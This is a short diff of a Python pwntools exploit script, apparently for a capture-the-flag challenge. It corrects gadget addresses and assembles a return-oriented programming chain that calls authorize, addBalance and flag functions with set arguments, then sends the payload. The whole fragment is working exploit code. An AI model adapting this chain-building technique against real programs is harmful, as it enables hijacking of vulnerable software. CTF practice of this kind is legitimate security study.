@@ -118,23 +118,23 @@ addBalance = binary.symbols['addBalance']
 flag = binary.symbols['flag']
 
 #: Gadgets
-pop_rdi = p64(0x4008f3)
-pop_rsi = p64(0x4008f1)
+pop_rdi = p64(0x401403)
+pop_rsi = p64(0x401401)
 
 #: Rop exploit v1
 context.clear(arch='amd64')
 rop.raw(offset)
 rop.raw(p64(authorize))
-rop.raw(0x401403)
+rop.raw(pop_rdi)
 rop.raw(p64(0xdeadbeef))
 rop.raw(p64(addBalance))
-rop.raw(0x401403)
+rop.raw(pop_rdi)
 rop.raw(p64(0xba5eba11))
-rop.raw(0x401401)
+rop.raw(pop_rsi)
 rop.raw(p64(0xbedabb1e))
 rop.raw(p64(0x0))
 rop.raw(p64(flag))
-exploit = rop.exploit()
+exploit = rop.chain()
 
 #: Send payload
 p.sendline('1')
